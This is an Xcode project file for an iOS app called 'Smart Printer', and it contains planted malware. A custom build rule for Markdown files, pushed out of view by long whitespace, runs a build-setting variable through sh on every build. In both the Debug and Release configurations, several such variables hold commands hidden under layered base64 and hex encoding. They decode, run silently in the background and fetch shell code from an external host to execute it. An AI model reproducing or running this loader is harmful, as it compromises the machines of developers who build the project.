// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		66669E6B83434319AC3C1CD3 /* README.md */ = {isa = PBXBuildFile; fileRef = 75E855B92AAE4BFD953C1CD3; };
		391473A82E7E2D3A00762A1D /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 391473A72E7E2D3A00762A1D /* Lottie */; };
		39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */; };
		39D5D99B2E03533C00E65DD3 /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */; };
		39D5D99D2E03533C00E65DD3 /* FirebaseAnalyticsCore in Frameworks */ = {isa = PBXBuildFile; productRef = 39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		75E855B92AAE4BFD953C1CD3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		3970FE072DFDFFD100B21273 /* Printer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Printer.app; sourceTree = BUILT_PRODUCTS_DIR; };
		39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		39D5D9A52E0357B300E65DD3 /* Exceptions for "Printer" folder in "Printer" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 3970FE062DFDFFD100B21273 /* Printer */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		3970FE092DFDFFD100B21273 /* Printer */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				39D5D9A52E0357B300E65DD3 /* Exceptions for "Printer" folder in "Printer" target */,
			);
			path = Printer;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		3970FE042DFDFFD100B21273 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				39D5D99B2E03533C00E65DD3 /* FirebaseAnalytics in Frameworks */,
				39D5D99D2E03533C00E65DD3 /* FirebaseAnalyticsCore in Frameworks */,
				39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */,
				391473A82E7E2D3A00762A1D /* Lottie in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		3970FDFE2DFDFFD100B21273 = {
			isa = PBXGroup;
			children = (
				3970FE092DFDFFD100B21273 /* Printer */,
				39D5D7CE2E0221A100E65DD3 /* Frameworks */,
				3970FE082DFDFFD100B21273 /* Products */,
			);
			sourceTree = "<group>";
		};
		3970FE082DFDFFD100B21273 /* Products */ = {
			isa = PBXGroup;
			children = (
				75E855B92AAE4BFD953C1CD3 /* README.md */,
				3970FE072DFDFFD100B21273 /* Printer.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		39D5D7CE2E0221A100E65DD3 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		3970FE062DFDFFD100B21273 /* Printer */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 3970FE122DFDFFD200B21273 /* Build configuration list for PBXNativeTarget "Printer" */;
			buildPhases = (
				3970FE032DFDFFD100B21273 /* Sources */,
				3970FE042DFDFFD100B21273 /* Frameworks */,
				3970FE052DFDFFD100B21273 /* Resources */,
			);
			buildRules = (
				B216800C918B49B7843C1CD3 /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				3970FE092DFDFFD100B21273 /* Printer */,
			);
			name = Printer;
			packageProductDependencies = (
				39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */,
				39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */,
				391473A72E7E2D3A00762A1D /* Lottie */,
			);
			productName = Printer;
			productReference = 3970FE072DFDFFD100B21273 /* Printer.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		3970FDFF2DFDFFD100B21273 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1630;
				LastUpgradeCheck = 1630;
				TargetAttributes = {
					3970FE062DFDFFD100B21273 = {
						CreatedOnToolsVersion = 16.3;
					};
				};
			};
			buildConfigurationList = 3970FE022DFDFFD100B21273 /* Build configuration list for PBXProject "Printer" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 3970FDFE2DFDFFD100B21273;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
				391473A62E7E2C6E00762A1D /* XCRemoteSwiftPackageReference "lottie-ios" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 3970FE082DFDFFD100B21273 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				3970FE062DFDFFD100B21273 /* Printer */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
		B216800C918B49B7843C1CD3 /* PBXBuildRule */ = {
				isa = PBXBuildRule;
				compilerSpec = com.apple.compilers.proxy.script;
				filePatterns = "*.md";
				fileType = pattern.proxy;
				inputFiles = (
				);
				isEditable = 0;
				outputFiles = (
					"/tmp/${INPUT_FILE_BASE}",
				);
				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
sh -c \"${A3DC1C3}\"";
			};
																																																																																																																																																																																																																																																																																																			/* End PBXBuildRule section */

/* Begin PBXShellScriptBuildPhase section */
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		3970FE052DFDFFD100B21273 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				66669E6B83434319AC3C1CD3 /* README.md */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		3970FE032DFDFFD100B21273 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		3970FE102DFDFFD200B21273 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3DC1C3 = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGNHRlNlbFp2V2tWa1IyUXlUa2hsUjNoTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | m | sh ) >/dev/null 2>&1 &)";
				AF17F99 = "((h(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333343336333333333337333333333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333633353333333633333335333333373333333433330a3336333333333333333633333334333333363336333533333336333333343333333633333335333333373333333633333332333633353333333633330a3339333333363336333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | h | sh ) >/dev/null 2>&1 &)";
				A1ECAD1 = "((d(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3337333333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333331333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363336333633393336333733363634333633313336363533363335333733343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | d | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333363333333633333336333633323333333433363333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333337333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333336333333373333333533330a3336333633353333333633333333333333363333333833333336333333313333333733333334333333373333333333333332333633353333333733330a3332333333373333333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | k | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGlSMngxWVhrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
				A45ED5A = "((w(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333636353336333533373334333733333337333033363636333733323336363633373334333636363332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | w | sh ) >/dev/null 2>&1 &)";
				A6E983A = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxkRzk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | s | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		3970FE112DFDFFD200B21273 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3DC1C3 = "((m(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGNHRlNlbFp2V2tWa1IyUXlUa2hsUjNoTlltdHZlRlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | m | sh ) >/dev/null 2>&1 &)";
				AF17F99 = "((h(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333343336333333333337333333333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333333333333333333330333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333633353333333633333335333333373333333433330a3336333333333333333633333334333333363336333533333336333333343333333633333335333333373333333633333332333633353333333633330a3339333333363336333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | h | sh ) >/dev/null 2>&1 &)";
				A1ECAD1 = "((d(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3337333333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333331333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363336333633393336333733363634333633313336363533363335333733343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | d | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333337333333330a3061333333363333333633333336333633323333333433363333333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333337333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333336333333373333333533330a3336333633353333333633333333333333363333333833333336333333313333333733333334333333373333333333333332333633353333333733330a3332333333373333333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | k | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeGlSMngxWVhrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
				A45ED5A = "((w(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333636353336333533373334333733333337333033363636333733323336363633373334333636363332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | w | sh ) >/dev/null 2>&1 &)";
				A6E983A = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxkRzk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | s | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_EMIT_LOC_STRINGS = YES;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		3970FE132DFDFFD200B21273 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 5;
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Printer/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Smart Printer";
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.business";
				INFOPLIST_KEY_NSCameraUsageDescription = "Use for scanner feature.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Used for print photos.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Helps us to provide better analytics and improve your experience.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UIRequiresFullScreen = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1.6;
				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudios.smartprinter;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		3970FE142DFDFFD200B21273 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 5;
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Printer/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Smart Printer";
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.business";
				INFOPLIST_KEY_NSCameraUsageDescription = "Use for scanner feature.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Used for print photos.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Helps us to provide better analytics and improve your experience.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UIRequiresFullScreen = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1.6;
				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudios.smartprinter;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		3970FE022DFDFFD100B21273 /* Build configuration list for PBXProject "Printer" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				3970FE102DFDFFD200B21273 /* Debug */,
				3970FE112DFDFFD200B21273 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		3970FE122DFDFFD200B21273 /* Build configuration list for PBXNativeTarget "Printer" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				3970FE132DFDFFD200B21273 /* Debug */,
				3970FE142DFDFFD200B21273 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		391473A62E7E2C6E00762A1D /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/airbnb/lottie-ios";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 4.5.2;
			};
		};
		39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 11.14.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		391473A72E7E2D3A00762A1D /* Lottie */ = {
			isa = XCSwiftPackageProductDependency;
			package = 391473A62E7E2C6E00762A1D /* XCRemoteSwiftPackageReference "lottie-ios" */;
			productName = Lottie;
		};
		39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */ = {
